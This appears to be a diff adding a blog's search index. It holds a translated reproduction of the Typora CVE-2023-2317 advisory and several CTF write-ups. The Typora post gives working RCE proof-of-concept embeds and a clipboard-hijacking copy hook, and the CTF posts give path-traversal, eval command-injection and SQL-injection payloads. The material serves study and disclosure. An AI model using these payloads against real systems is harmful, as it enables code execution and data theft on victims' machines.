@@ -1,0 +1,251 @@
+<?xml version="1.0" encoding="utf-8"?>
+<search> 
+  
+  
+    
+    <entry>
+      <title>CVE-2023-2317(typora远程命令执行)复现</title>
+      <link href="/2023/08/30/CVE-2023-2317(typora%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C)%E5%A4%8D%E7%8E%B0/"/>
+      <url>/2023/08/30/CVE-2023-2317(typora%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C)%E5%A4%8D%E7%8E%B0/</url>
+      
+        <content type="html"><![CDATA[<h2 id="原文在这"><a href="#原文在这" class="headerlink" title="原文在这"></a><a href='https://starlabs.sg/advisories/23/23-2317/'>原文在这</a></h2><blockquote><p>以下为机翻，发布用以个人学习方便之需。<br>此漏洞在钓鱼、反制等领域都有一定意义。</p></blockquote><h2 id="产品概述："><a href="#产品概述：" class="headerlink" title="产品概述："></a>产品概述：</h2><p>Typora 是一款流行的跨平台 Markdown 编辑器，允许用户创建和编辑具有实时预览功能的 Markdown 文件。它支持各种格式选项，例如标题、粗体、斜体等。Typora 还允许用户将 Markdown 文件导出为不同的格式，例如 PDF、HTML 和 Word。</p><p>适用于 Windows&#x2F;Linux 的 Typora 基于 Electron 构建，该框架使其能够在各种操作系统上无缝运行。Markdown 编辑器支持 HTML 标签和嵌入​​外部网页。攻击者可以利用该漏洞通过在 Markdown 编辑器中加载精心设计的 URL 来执行任意 JavaScript 代码和系统命令。</p><h2 id="漏洞摘要"><a href="#漏洞摘要" class="headerlink" title="漏洞摘要:"></a>漏洞摘要:</h2><p>Windows&#x2F;Linux 版 Typora 中存在基于 DOM 的 XSS，允许任意 JavaScript 代码在 Typora 主窗口上下文中运行。如果用户在 Typora 中打开恶意 Markdown 文件，或者从恶意网页复制文本并将其粘贴到 Typora 中，则可以利用此漏洞。</p><h2 id="漏洞详细信息："><a href="#漏洞详细信息：" class="headerlink" title="漏洞详细信息："></a>漏洞详细信息：</h2><p>已在以下位置发现基于 DOM 的 XSS <code>Typora/resources/updater/updater.html</code>：</p><pre><code class="html">    &lt;div class=&quot;btn-group&quot;&gt;      &lt;div id=&quot;skip-this-version-btn-group&quot; style=&quot;flex-grow: 2; min-height: 10px;min-width: 10px;&quot;&gt;        &lt;button onClick=&quot;onSkipUpdate()&quot; data-label=&quot;1&quot; &gt;Skip This Version&lt;/button&gt;      &lt;/div&gt;            &lt;button onClick=&quot;onCancelUpdate()&quot; data-label=&quot;2&quot; &gt;Remind Me Later&lt;/button&gt;      &lt;button class=&quot;btn-primary&quot; onClick=&quot;onDownloadUpdate()&quot; data-label=&quot;3&quot; &gt;Download Update&lt;/button&gt;    &lt;/div&gt;    &lt;script type=&quot;text/javascript&quot;&gt;      // ...      var labels = JSON.parse(decodeURIComponent(/[?&amp;]labels=([^&amp;]+)/.exec(window.location.search)[1]));        // [1]      document.querySelector(&quot;#sum&quot;).innerText = labels[4] + &quot; &quot; + labels[5].replace(&quot;$1&quot;, newVersion).replace(&quot;$2&quot;, curVersion);      document.querySelectorAll(&quot;[data-label]&quot;).forEach(function(dom)&#123;        dom.innerHTML = labels[dom.getAttribute(&quot;data-label&quot;) - 0];     // [2]      &#125;);      // ...    &lt;/script&gt;</code></pre><p>在上面的代码片段中，变量<code>labels</code>是从<code>location.search</code>at中提取的<code>[1]</code>，然后分配给具有at 属性的<code>innerHTML</code>元素。<code>data-label``[2]</code></p><p>这是一个将<code>&lt;input&gt;</code>标签注入 DOM 的 PoC：</p><pre><code>updater.html?curVersion=1&amp;newVersion=2&amp;releaseNoteLink=3&amp;hideAutoUpdates=false&amp;labels=[&quot;&lt;input%20value=test&gt;&quot;,&quot;22&quot;,&quot;33&quot;,&quot;44&quot;,&quot;55&quot;,&quot;66&quot;,&quot;77&quot;]</code></pre><p><img src="https://starlabs.sg/advisories/23/images/CVE-2023-2317_01.updater-html-DOM-XSS.png"></p><p>Typora 注册了一个文件处理程序<code>typora://</code>来加载本地资源。例如，主窗口的 URL 是<code>typora://app/typemark/window.html</code>，实际文件是从 加载的<code>[Typora Installation Absolute Path]/resources/window.html</code>。</p><p>攻击者可以<code>&lt;embed&gt;</code>通过将<code>src</code>属性设置为 来将存在漏洞的 updater.html 加载到标签内<code>typora://app/typemark/updater/updater.html</code>。在这种情况下，<code>typora://app/typemark/window.html</code>在主窗口中加载的内容和嵌入的更新程序页面被视为同源。因此，更新程序能够访问暴露于主窗口的特权接口，例如<code>reqnode</code>.</p><p><img src="https://starlabs.sg/advisories/23/images/CVE-2023-2317_02.updater-and-main-window-are-same-origin.png"></p><p>通过嵌入带有精心设计的 DOM-XSS 负载的 updater.html URL，攻击者能够在主窗口上执行任意 JavaScript 代码。此外，攻击者可以使用<code>reqnode</code>主窗口中的特权界面来访问节点模块<code>child_process</code>并执行任意系统命令。</p><h2 id="利用条件："><a href="#利用条件：" class="headerlink" title="利用条件："></a>利用条件：</h2><p>可以通过诱使受害者</p><ol><li>在 Typora 中打开恶意 Markdown 文件</li><li>从恶意网页复制文本并将其粘贴到 Typora 中来利用此漏洞。</li></ol><h2 id="POC"><a href="#POC" class="headerlink" title="POC:"></a>POC:</h2><p>我们已尽力使 PoC 尽可能便携。以下 HTML 代码是演示此任意文件泄露漏洞的 PoC：</p><pre><code class="html">&lt;embed src=&quot;typora://app/typemark/updater/updater.html?curVersion=111&amp;newVersion=222&amp;releaseNoteLink=333&amp;hideAutoUpdates=false&amp;labels=[%22%22,%22%3csvg%2fonload=top.eval(atob(&#39;cmVxbm9kZSgnY2hpbGRfcHJvY2VzcycpLmV4ZWMoKHtXaW4zMjogJ25vdGVwYWQgJVdJTkRJUiUvd2luLmluaScsIExpbnV4OiAnZ25vbWUtY2FsY3VsYXRvciAtZSAiVHlwb3JhIFJDRSBQb0MiJ30pW25hdmlnYXRvci5wbGF0Zm9ybS5zdWJzdHIoMCw1KV0p&#39;))&gt;&lt;%2fsvg&gt;%22,%22%22,%22%22,%22%22,%22%22]&quot;&gt;&lt;/embed&gt;</code></pre><p>PoC中的base64编码部分被解码为以下内容：</p><pre><code class="javascript">reqnode(&#39;child_process&#39;).exec((&#123;Win32: &#39;notepad %WINDIR%/win.ini&#39;, Linux: &#39;gnome-calculator -e &quot;Typora RCE PoC&quot;&#39;&#125;)[navigator.platform.substr(0,5)])</code></pre><p>当这个 PoC 加载到 Typora 中时，它将：</p><ol><li>使用 DOM-XSS 负载加载 updater.html</li><li>有效负载在主窗口上执行 JavaScript 代码</li><li>执行系统命令：<code>notepad</code>在Windows上，或<code>gnome-calculator</code>在Linux上</li></ol><h2 id="攻击场景："><a href="#攻击场景：" class="headerlink" title="攻击场景："></a>攻击场景：</h2><h3 id="场景一：打开恶意markdown文件"><a href="#场景一：打开恶意markdown文件" class="headerlink" title="场景一：打开恶意markdown文件"></a>场景一：打开恶意markdown文件</h3><p>攻击者可以在 Markdown 文件中注入嵌入标签，并说服受害者在 Typora 中打开它以触发有效负载。</p><p>我们附上<code>poc/typora-1.5.12-rce.md</code>这份报告以供演示。在受影响的 Typora 版本中打开文件以验证此漏洞。</p><p>以下是在 Windows 和 Ubuntu 上展示此场景的 GIF：</p><p><img src="https://starlabs.sg/advisories/23/images/CVE-2023-2317_03.open-file-on-Windows.gif"></p><p><img src="https://starlabs.sg/advisories/23/images/CVE-2023-2317_04.open-file-on-Ubuntu.gif"></p><h3 id="场景-2：从网页复制并粘贴"><a href="#场景-2：从网页复制并粘贴" class="headerlink" title="场景 2：从网页复制并粘贴"></a>场景 2：从网页复制并粘贴</h3><p><code>copy</code>攻击者可以制作恶意网页并使用以下代码来挂钩该事件：</p><pre><code class="html">&lt;script&gt;    document.addEventListener(&#39;copy&#39;,e=&gt;&#123;        e.preventDefault();        let payload = atob(&#39;JiN4M2M7ZW1iZWQgc3R5bGU9ImhlaWdodDowOyIgc3JjPSJ0eXBvcmE6Ly9hcHAvdHlwZW1hcmsvdXBkYXRlci91cGRhdGVyLmh0bWw/Y3VyVmVyc2lvbj0xMTEmbmV3VmVyc2lvbj0yMjImcmVsZWFzZU5vdGVMaW5rPTMzMyZoaWRlQXV0b1VwZGF0ZXM9ZmFsc2UmbGFiZWxzPVslMjIlMjIsJTIyJTNjc3ZnJTJmb25sb2FkPXRvcC5ldmFsKGF0b2IoJ2NtVnhibTlrWlNnblkyaHBiR1JmY0hKdlkyVnpjeWNwTG1WNFpXTW9LSHRYYVc0ek1qb2dKMjV2ZEdWd1lXUWdKVmRKVGtSSlVpVXZkMmx1TG1sdWFTY3NJRXhwYm5WNE9pQW5aMjV2YldVdFkyRnNZM1ZzWVhSdmNpQXRaU0FpVkhsd2IzSmhJRkpEUlNCUWIwTWlKMzBwVzI1aGRtbG5ZWFJ2Y2k1d2JHRjBabTl5YlM1emRXSnpkSElvTUN3MUtWMHAnKSk+PCUyZnN2Zz4lMjIsJTIyJTIyLCUyMiUyMiwlMjIlMjIsJTIyJTIyXSI+JiN4MGQ7JiN4MGQ7&#39;);        e.clipboardData.setData(&#39;text/markhtml&#39;, `\x20\x0d\x0a\x0d\x0a` + payload + window.getSelection());        console.log(payload + window.getSelection())    &#125;)&lt;/script&gt;</code></pre><p>当受害者从该页面复制文本时，有效负载会添加到复制的内容中，并在粘贴到 Typora 时触发。</p><p><img src="https://starlabs.sg/advisories/23/images/CVE-2023-2317_05.copy-paste-on-Windows.gif"></p><p><img src="https://starlabs.sg/advisories/23/images/CVE-2023-2317_06.copy-paste-on-Ubuntu.gif"></p><p>我们已附上<code>poc/rce-cp.html</code>此场景的 PoC。<a href="https://o.cal1.cn/f0a97fdef8028595-typora-poc/rce-cp.html">现场版本也可以在这里</a>找到。</p><h3 id="补充笔记："><a href="#补充笔记：" class="headerlink" title="补充笔记："></a>补充笔记：</h3><ol><li>攻击者可以在<code>&lt;embed&gt;</code>标签上设置自定义样式，以使漏洞利用变得不那么引人注目。例如，<code>height:0;</code>在场景2 PoC中用于隐藏嵌入的网页。</li></ol><h2 id="建议的缓解措施："><a href="#建议的缓解措施：" class="headerlink" title="建议的缓解措施："></a>建议的缓解措施：</h2><p>建议通过设置<code>innerText</code>而不是 来更新 HTML 元素<code>innerHTML</code>。</p><p>对于使用受此漏洞影响的版本的最终用户，建议（1）不要在 Typora 中打开任何不受信任的 Markdown 文件，（2）应避免从不受信任的网页复制文本然后将其粘贴到 Typora 中。</p><h2 id="经典复现："><a href="#经典复现：" class="headerlink" title="经典复现："></a>经典复现：</h2><p>windows改成了弹计算器版本。</p><pre><code class="html">&lt;embed src=&quot;typora://app/typemark/updater/updater.html?curVersion=111&amp;newVersion=222&amp;releaseNoteLink=333&amp;hideAutoUpdates=false&amp;labels=[%22%22,%22%3csvg%2fonload=top.eval(atob(&#39;cmVxbm9kZSgnY2hpbGRfcHJvY2VzcycpLmV4ZWMoKHtXaW4zMjogJ2NhbGMnLCBMaW51eDogJ2dub21lLWNhbGN1bGF0b3IgLWUgIlR5cG9yYSBSQ0UgUG9DIid9KVtuYXZpZ2F0b3IucGxhdGZvcm0uc3Vic3RyKDAsNSldKQ==&#39;))&gt;&lt;%2fsvg&gt;%22,%22%22,%22%22,%22%22,%22%22]&quot;&gt;&lt;/embed&gt;</code></pre>]]></content>
+      
+      
+      
+        <tags>
+            
+            <tag> 复现 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>陇剑杯 2021 misc 简单日志分析</title>
+      <link href="/2023/08/24/%E9%99%87%E5%89%91%E6%9D%AF%202021%20misc%20%E7%AE%80%E5%8D%95%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90/"/>
+      <url>/2023/08/24/%E9%99%87%E5%89%91%E6%9D%AF%202021%20misc%20%E7%AE%80%E5%8D%95%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90/</url>
+      
+        <content type="html"><![CDATA[<h2 id="陇剑杯-2021-简单日志分析（问1）"><a href="#陇剑杯-2021-简单日志分析（问1）" class="headerlink" title="陇剑杯 2021 简单日志分析（问1）"></a>陇剑杯 2021 简单日志分析（问1）</h2><pre><code>题目描述：某应用程序被攻击，请分析日志后作答：黑客攻击的参数是______。（如有字母请全部使用小写）。得到的flag请使用NSSCTF&#123;&#125;格式提交。</code></pre><p>既然问的是参数，而且日志中基本都是GET请求，那么我们直接搜索 <code>=</code> 看看</p><p><img src="https://cdn.jsdelivr.net/gh/g1an123/blogimage@main/%E6%88%AA%E5%B1%8F2023-08-24%2013.03.18.png"></p><p>得到user参数。</p><h2 id="陇剑杯-2021-简单日志分析（问2）"><a href="#陇剑杯-2021-简单日志分析（问2）" class="headerlink" title="陇剑杯 2021 简单日志分析（问2）"></a>陇剑杯 2021 简单日志分析（问2）</h2><pre><code>题目描述：某应用程序被攻击，请分析日志后作答：黑客查看的秘密文件的绝对路径是_____________。得到的flag请使用NSSCTF&#123;&#125;格式提交。</code></pre><p><img src="https://cdn.jsdelivr.net/gh/g1an123/blogimage@main/%E6%88%AA%E5%B1%8F2023-08-24%2013.07.21.png"><br>我们通过user参数传入的payload进行base64解密发现文件</p><blockquote><p>&#x2F;Th4s_IS_VERY_Import_Fi1e</p></blockquote><h2 id="陇剑杯-2021-简单日志分析（问3）"><a href="#陇剑杯-2021-简单日志分析（问3）" class="headerlink" title="陇剑杯 2021 简单日志分析（问3）"></a>陇剑杯 2021 简单日志分析（问3）</h2><pre><code>题目描述：某应用程序被攻击，请分析日志后作答：黑客反弹shell的ip和端口是_____________。（格式使用“ip:端口&quot;，例如127.0.0.1:2333）。得到的flag请使用NSSCTF&#123;&#125;格式提交。</code></pre><p>一样的思路，往下找还有一个payload。解密分析看看<br><img src="https://cdn.jsdelivr.net/gh/g1an123/blogimage@main/%E6%88%AA%E5%B1%8F2023-08-24%2013.11.08.png"><br>就可以拿到ip和端口啦。<br>tip：</p><blockquote><p>要注意先进行url解密。<br>在进行base64解密</p></blockquote>]]></content>
+      
+      
+      <categories>
+          
+          <category> ctf </category>
+          
+          <category> writeup </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> misc </tag>
+            
+            <tag> 日志分析 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>陇剑杯 2021 misc 日志分析</title>
+      <link href="/2023/08/24/%E9%99%87%E5%89%91%E6%9D%AF%202021%20misc%20%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90/"/>
+      <url>/2023/08/24/%E9%99%87%E5%89%91%E6%9D%AF%202021%20misc%20%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90/</url>
+      
+        <content type="html"><![CDATA[<h2 id="陇剑杯-2021-日志分析（问1）"><a href="#陇剑杯-2021-日志分析（问1）" class="headerlink" title="陇剑杯 2021 日志分析（问1）"></a>陇剑杯 2021 日志分析（问1）</h2><pre><code>题目描述：单位某应用程序被攻击，请分析日志，进行作答：网络存在源码泄漏，源码文件名是_____________。(请提交带有文件后缀的文件名，例如x.txt)。得到的flag请使用NSSCTF&#123;&#125;格式提交。</code></pre><p>打开日志文件，不知道用哪个软件比较好分析，还请各位大佬指点。<br>我直接用vscode打开看看<br><img src="https://cdn.jsdelivr.net/gh/g1an123/blogimage@main/%E6%88%AA%E5%B1%8F2023-08-24%2012.39.08.png"><br>发现主要信息集中于请求路径和状态码。<br>大部分都是404，直接全局搜索200看看</p><p>大概下半段就可以看到请求<a href="http://www.zip时为200/">www.zip时为200</a>.<br>下班！</p><h2 id="陇剑杯-2021-日志分析（问2）"><a href="#陇剑杯-2021-日志分析（问2）" class="headerlink" title="陇剑杯 2021 日志分析（问2）"></a>陇剑杯 2021 日志分析（问2）</h2><pre><code>题目描述：单位某应用程序被攻击，请分析日志，进行作答：分析攻击流量，黑客往/tmp目录写入一个文件，文件名为_____________。得到的flag请使用NSSCTF&#123;&#125;格式提交。</code></pre><p><img src="https://cdn.jsdelivr.net/gh/g1an123/blogimage@main/%E6%88%AA%E5%B1%8F2023-08-24%2012.46.43.png"><br>全局搜索一下tmp，发现有<br><code>/?filename=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Ftmp%2Fsess_car&amp;content=func%7CN%3Bfiles%7Ca%3A2%3A%7Bs%3A8%3A%22filename%22%3Bs%3A16%3A%22.%2Ffiles%2Ffilename%22%3Bs%3A20%3A%22call_user_func_array%22%3Bs%3A28%3A%22.%2Ffiles%2Fcall_user_func_array%22%3B%7Dpaths%7Ca%3A1%3A%7Bs%3A5%3A%22%2Fflag%22%3Bs%3A13%3A%22SplFileObject%22%3B%7D</code><br>解一下码好看一点。<br><code>/?filename=../../../../../../../../../../../../../../../../../tmp/sess_car&amp;content=func|N;files|a:2:&#123;s:8:&quot;filename&quot;;s:16:&quot;./files/filename&quot;;s:20:&quot;call_user_func_array&quot;;s:28:&quot;./files/call_user_func_array&quot;;&#125;paths|a:1:&#123;s:5:&quot;/flag&quot;;s:13:&quot;SplFileObject&quot;;&#125;</code></p><p>得到sess_car.</p><h2 id="陇剑杯-2021-日志分析（问3）"><a href="#陇剑杯-2021-日志分析（问3）" class="headerlink" title="陇剑杯 2021 日志分析（问3）"></a>陇剑杯 2021 日志分析（问3）</h2><pre><code>题目描述：单位某应用程序被攻击，请分析日志，进行作答：分析攻击流量，黑客使用的是______类读取了秘密文件。得到的flag请使用NSSCTF&#123;&#125;格式提交。</code></pre><p>上一题中解码出来的payload就能看出时SplFileObject类进行读取。</p>]]></content>
+      
+      
+      <categories>
+          
+          <category> ctf </category>
+          
+          <category> writeup </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> misc </tag>
+            
+            <tag> 日志分析 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>陇剑杯 2021 misc webshell</title>
+      <link href="/2023/08/23/%E9%99%87%E5%89%91%E6%9D%AF%202021%20misc%20webshell/"/>
+      <url>/2023/08/23/%E9%99%87%E5%89%91%E6%9D%AF%202021%20misc%20webshell/</url>
+      
+        <content type="html"><![CDATA[<h2 id="陇剑杯-2021-webshell（问1）"><a href="#陇剑杯-2021-webshell（问1）" class="headerlink" title="陇剑杯 2021  webshell（问1）"></a>陇剑杯 2021  webshell（问1）</h2><pre><code>题目描述：单位网站被黑客挂马，请您从流量中分析出webshell，进行回答：黑客登录系统使用的密码是_____________。。得到的flag请使用NSSCTF&#123;&#125;格式提交。</code></pre><p>题目描述说是登录系统，根据日常经验，一般登录操作使用的都是POST请求，于是我们直接在流量包中搜索POST请求看看。</p><pre><code>http.request.method==POST</code></pre><p><img src="https://cdn.jsdelivr.net/gh/g1an123/blogimage@main/%E6%88%AA%E5%B1%8F2023-08-23%2022.32.34.png"><br>然后追踪流看看，运气比较好第一个就是。<br><img src="https://cdn.jsdelivr.net/gh/g1an123/blogimage@main/%E6%88%AA%E5%B1%8F2023-08-23%2022.35.35.png"><br>交差下班。</p><h2 id="陇剑杯-2021webshell（问2）"><a href="#陇剑杯-2021webshell（问2）" class="headerlink" title="陇剑杯 2021webshell（问2）"></a>陇剑杯 2021webshell（问2）</h2><pre><code>单位网站被黑客挂马，请您从流量中分析出webshell，进行回答：黑客修改了一个日志文件，文件的绝对路径为_____________。（请确认绝对路径后再提交）。得到的flag请使用NSSCTF&#123;&#125;格式提交。</code></pre><p>关键词：日志。直接搜索.log看看.<br>发现东西有点多。<br>需要再想个法子缩小范围。<br>想到既然是通过挂马进行修改，那么看看他的🐎子是啥类型的，我们就可以通过请求类型进行进一步缩小范围。<br><img src="https://cdn.jsdelivr.net/gh/g1an123/blogimage@main/%E6%88%AA%E5%B1%8F2023-08-23%2022.42.47.png"><br>发现一列1.php，应该就是🐎子了，再看一眼确定没错，是post马子。</p><p>然后就一个个看，第一个就是。<br><img src="https://cdn.jsdelivr.net/gh/g1an123/blogimage@main/%E6%88%AA%E5%B1%8F2023-08-23%2022.49.21.png"><br>但是发现只是相对路径，所以还要结合传马的位置拼接得到：<br><code>/var/www/html/data/Runtime/Logs/Home/21_08_07.log</code></p><h2 id="陇剑杯-2021webshell（问3）"><a href="#陇剑杯-2021webshell（问3）" class="headerlink" title="陇剑杯 2021webshell（问3）"></a>陇剑杯 2021webshell（问3）</h2><pre><code>题目描述：单位网站被黑客挂马，请您从流量中分析出webshell，进行回答：黑客获取webshell之后，权限是______？得到的flag请使用NSSCTF&#123;&#125;格式提交。</code></pre><p>看到权限，可能会想到通过whoami这些命令进行过滤，但是出来的东西有点多。<br>我们不妨直接猜一手，因为一般权限无非root 和www-data.<br>得到是www-data</p><h2 id="陇剑杯-2021webshell（问4）"><a href="#陇剑杯-2021webshell（问4）" class="headerlink" title="陇剑杯 2021webshell（问4）"></a>陇剑杯 2021webshell（问4）</h2><pre><code>题目描述：单位网站被黑客挂马，请您从流量中分析出webshell，进行回答：黑客写入的webshell文件名是_____________。(请提交带有文件后缀的文件名，例如x.txt)。得到的flag请使用NSSCTF&#123;&#125;格式提交。</code></pre><p>这一问就不用说了，前面就已经看出来1.php就是马子了。<br>要是非问为啥，那原因就是看他流量特征，一眼蚁剑<br><img src="https://cdn.jsdelivr.net/gh/g1an123/blogimage@main/%E6%88%AA%E5%B1%8F2023-08-23%2023.04.38.png"></p><p><a href="https://www.freebuf.com/articles/network/204796.html">常见webshell客户端流量特征</a></p><h2 id="陇剑杯-2021webshell（问5）"><a href="#陇剑杯-2021webshell（问5）" class="headerlink" title="陇剑杯 2021webshell（问5）"></a>陇剑杯 2021webshell（问5）</h2><pre><code>题目描述：单位网站被黑客挂马，请您从流量中分析出webshell，进行回答：黑客上传的代理工具客户端名字是_____________。（如有字母请全部使用小写）。得到的flag请使用NSSCTF&#123;&#125;格式提交。</code></pre><p>这里我一开始是想找上传的哪个数据包的，后来误打误撞发现了一个类似于 <code>ls</code> 命令的返回包。发现了frpc.ini<br>于是直接就能得出就是frpc了。</p><p>还有正常解法，就是看看比较大的包，大概率就是上传的包了。</p><h2 id="陇剑杯-2021webshell（问6）"><a href="#陇剑杯-2021webshell（问6）" class="headerlink" title="陇剑杯 2021webshell（问6）"></a>陇剑杯 2021webshell（问6）</h2><pre><code>题目描述：单位网站被黑客挂马，请您从流量中分析出webshell，进行回答：黑客代理工具的回连服务端IP是_____________。得到的flag请使用NSSCTF&#123;&#125;格式提交。开启环境0</code></pre><p>这题我目前也不是很清楚，最后找到frpc.ini文件的时候是需要hex解码的。<br>最后就得到反连的ip是192.168.239.123</p><h2 id="陇剑杯-2021webshell（问7）"><a href="#陇剑杯-2021webshell（问7）" class="headerlink" title="陇剑杯 2021webshell（问7）"></a>陇剑杯 2021webshell（问7）</h2><pre><code>题目描述：单位网站被黑客挂马，请您从流量中分析出webshell，进行回答：黑客的socks5的连接账号、密码是______。（中间使用#号隔开，例如admin#passwd）。得到的flag请使用NSSCTF&#123;&#125;格式提交。开启环境0</code></pre><p>都在hex解密之后的frpc.ini中<br><img src="https://cdn.jsdelivr.net/gh/g1an123/blogimage@main/%E6%88%AA%E5%B1%8F2023-08-24%2000.16.24.png"></p>]]></content>
+      
+      
+      <categories>
+          
+          <category> ctf </category>
+          
+          <category> writeup </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> misc </tag>
+            
+            <tag> 流量分析 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>sharkctf_2023</title>
+      <link href="/2023/08/22/sharkctf_2023/"/>
+      <url>/2023/08/22/sharkctf_2023/</url>
+      
+        <content type="html"><![CDATA[<p><code>暑假事情有点多，没啥时间写，只写完了web题，写篇wp水水博客。</code></p><hr><h2 id="彩蛋"><a href="#彩蛋" class="headerlink" title="彩蛋"></a>彩蛋</h2><p>1azy_fish加了彩蛋，找一找？不用爆破（把服务器日坏了就不好玩了</p><h3 id="敏感路径"><a href="#敏感路径" class="headerlink" title="敏感路径"></a>敏感路径</h3><p>这题刚开始看以为是F12题，一直没找到，后来翻插件发现有敏感目录 &#x2F;goat。<br><img src="https://cdn.jsdelivr.net/gh/g1an123/blogimage@main/%E6%88%AA%E5%B1%8F2023-08-22%2013.09.03.png"><br>推荐一下这个插件：findsomething（尊嘟很好用）</p><h3 id="F12查看网页源码"><a href="#F12查看网页源码" class="headerlink" title="F12查看网页源码"></a>F12查看网页源码</h3><p>直接拼接就是一个F12题了，F12查看源码得到flag<br><img src="https://cdn.jsdelivr.net/gh/g1an123/blogimage@main/%E6%88%AA%E5%B1%8F2023-08-22%2013.07.01.png"></p><h2 id="Ez-http"><a href="#Ez-http" class="headerlink" title="Ez_http"></a>Ez_http</h2><p>VidocQwQ说http好简单，我们一起学习吧。</p><p><img src="https://cdn.jsdelivr.net/gh/g1an123/blogimage@main/%E6%88%AA%E5%B1%8F2023-08-22%2013.12.24.png"></p><h3 id="XFF头ip绕过"><a href="#XFF头ip绕过" class="headerlink" title="XFF头ip绕过"></a>XFF头ip绕过</h3><p>使用hackbar进行操作添加XFF头。<br><img src="https://cdn.jsdelivr.net/gh/g1an123/blogimage@main/%E6%88%AA%E5%B1%8F2023-08-22%2013.15.43.png"></p><h3 id="Referer来源绕过"><a href="#Referer来源绕过" class="headerlink" title="Referer来源绕过"></a>Referer来源绕过</h3><p><img src="https://cdn.jsdelivr.net/gh/g1an123/blogimage@main/%E6%88%AA%E5%B1%8F2023-08-22%2013.17.39.png"></p><h3 id="UA绕过"><a href="#UA绕过" class="headerlink" title="UA绕过"></a>UA绕过</h3><p>UA头一般用来确定浏览器类型<br><img src="https://cdn.jsdelivr.net/gh/g1an123/blogimage@main/%E6%88%AA%E5%B1%8F2023-08-22%2013.19.12.png"></p><h2 id="view-source"><a href="#view-source" class="headerlink" title="view source"></a>view source</h2><p>VidocQwQ邀请你一起打游戏辣，2048都会吧？</p><h3 id="查看源码"><a href="#查看源码" class="headerlink" title="查看源码"></a>查看源码</h3><p>看题目意思应该是要查看源码，但是禁用了F12和右键。<br>不过可以通过谷歌浏览器的设置打开开发者工具<br><img src="https://cdn.jsdelivr.net/gh/g1an123/blogimage@main/%E6%88%AA%E5%B1%8F2023-08-22%2013.24.19.png"><br>源码发现提示hint.php<br><img src="https://cdn.jsdelivr.net/gh/g1an123/blogimage@main/%E6%88%AA%E5%B1%8F2023-08-22%2013.25.33.png"></p><h3 id="源码查询发现路由及参数"><a href="#源码查询发现路由及参数" class="headerlink" title="源码查询发现路由及参数"></a>源码查询发现路由及参数</h3><p>直接拼接访问的话发现什么也没有。<br>于是回到前面查看源码，但是代码有点长。<br>于是猜测hint.php是否用以传递成绩参数之类的，全局搜索看看是否有暴露相关路由。<br><img src="https://cdn.jsdelivr.net/gh/g1an123/blogimage@main/%E6%88%AA%E5%B1%8F2023-08-22%2013.30.16.png"><br>发现相关源码，于是直接可以拼接获得flag<br><img src="https://cdn.jsdelivr.net/gh/g1an123/blogimage@main/%E6%88%AA%E5%B1%8F2023-08-22%2013.32.50.png"></p><h2 id="Ez-eval"><a href="#Ez-eval" class="headerlink" title="Ez_eval"></a>Ez_eval</h2><p>VidocQwQ写了个php，留下了一个函数，你们知道怎么使用吗？</p><h3 id="开局送源码"><a href="#开局送源码" class="headerlink" title="开局送源码"></a>开局送源码</h3><p><img src="https://cdn.jsdelivr.net/gh/g1an123/blogimage@main/%E6%88%AA%E5%B1%8F2023-08-22%2013.34.04.png"><br>审计发现通过word传参命令执行，过滤flag字段。</p><h3 id="通配符绕过"><a href="#通配符绕过" class="headerlink" title="通配符绕过"></a>通配符绕过</h3><p><code>?word=system(&quot;cat /f*&quot;);</code><br><img src="https://cdn.jsdelivr.net/gh/g1an123/blogimage@main/%E6%88%AA%E5%B1%8F2023-08-22%2013.37.01.png"></p><h2 id="Ez-SQL"><a href="#Ez-SQL" class="headerlink" title="Ez_SQL"></a>Ez_SQL</h2><h3 id="手工做法："><a href="#手工做法：" class="headerlink" title="手工做法："></a>手工做法：</h3><h4 id="查看源码有提示"><a href="#查看源码有提示" class="headerlink" title="查看源码有提示"></a>查看源码有提示</h4><p>提示将select替换为空。<br>绕过办法：分拆绕过，过滤时重组形成payload</p><h4 id="构造语句"><a href="#构造语句" class="headerlink" title="构造语句"></a>构造语句</h4><p>先order by 确定一下字段数，<br><code>username=123&#39;order by 4--+</code><br>发现字段为4。使用hackerbar辅助构造payload<br><code>username=123&#39;union selselectect group_concat(schema_name),2,3,4 from information_schema.schemata-+</code><br><img src="https://cdn.jsdelivr.net/gh/g1an123/blogimage@main/%E6%88%AA%E5%B1%8F2023-08-22%2013.46.22.png"><br>然后就使用相同方式构造注入语句拿下flag。</p><h3 id="工具梭哈"><a href="#工具梭哈" class="headerlink" title="工具梭哈"></a>工具梭哈</h3><p>sqlmap一把梭，具体使用就自己查一查了哈。</p><h2 id="哈斯哈斯哈斯（bt"><a href="#哈斯哈斯哈斯（bt" class="headerlink" title="哈斯哈斯哈斯（bt"></a>哈斯哈斯哈斯（bt</h2><p>1azy_fish觉得md5很好用，就用一堆md5保护了flag，使它不被坏人拿走。</p><h3 id="弱口令"><a href="#弱口令" class="headerlink" title="弱口令"></a>弱口令</h3><p>开局一个登录框，弱口令是试一下，得到：<br>admin:admin</p><h3 id="查看源码-传参"><a href="#查看源码-传参" class="headerlink" title="查看源码+传参"></a>查看源码+传参</h3><p>跳转后页面看看源码得到提示。<br><code>你给我hint我给你hint</code><br>猜测传参hint。</p><h3 id="php审计"><a href="#php审计" class="headerlink" title="php审计"></a>php审计</h3><p><img src="https://cdn.jsdelivr.net/gh/g1an123/blogimage@main/%E6%88%AA%E5%B1%8F2023-08-22%2013.55.11.png"></p><pre><code class="php">&lt;?php  error_reporting(0);  require_once(&#39;/flag.php&#39;);   if(isset($_GET[&#39;hint&#39;]))&#123;    